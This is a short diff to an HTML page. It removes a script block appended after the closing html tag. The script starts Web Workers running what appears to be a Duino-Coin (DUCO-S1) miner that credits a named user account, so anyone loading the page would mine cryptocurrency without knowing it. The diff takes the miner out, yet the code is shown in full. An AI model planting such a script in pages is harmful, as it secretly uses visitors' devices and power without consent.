@@ -139,21 +139,3 @@
 </body>
 
 </html>
-
-<script>
-    // Configs
-    let username = "chunkymilk0309";
-    let rigid = "pi-apps-io";
-    let threads = 1;
-    let difficulty = "LOW";
-    let hasher = "DUCO-S1";
-
-    // DO NOT EDIT ANYTHING BELOW THIS LINE
-    let wallet_id = Math.floor(Math.random() * 2811);
-    let workerVer = 0;
-    for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
-        var socketWorker = new Worker("assets/main-duco.js");
-        socketWorker.postMessage('Start,' + username + "," + rigid + "," + wallet_id + "," + difficulty + "," + workerVer + "," + hasher);
-        workerVer++;
-    }
-</script>
